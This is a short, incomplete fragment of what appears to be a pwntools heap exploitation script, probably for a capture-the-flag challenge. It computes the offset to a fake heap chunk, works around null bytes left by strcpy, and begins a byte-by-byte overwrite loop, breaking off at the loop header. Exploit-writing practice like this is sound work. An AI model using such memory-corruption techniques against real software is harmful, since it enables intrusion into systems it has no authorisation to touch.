...
def run():
    ...
    log.info('diff between idx1 and fakechunk: ' + hex(diff)) # 0xfc0
    
    # '\0' padding caused by strcpy
    diff_strip = p64(diff).strip('\0') # '\xc0\x0f'
    number_of_zeros = len(p64(diff)) - len(diff_strip)
    log.info('diff_strip: ' + diff_strip)
    log.info('number_of_zeros: ' + hex(number_of_zeros)) # 0x06
    # edit(1, 'A'*16+'\xc0\x0f')
    for i in range(number_of_zeros + 1): #range(7)
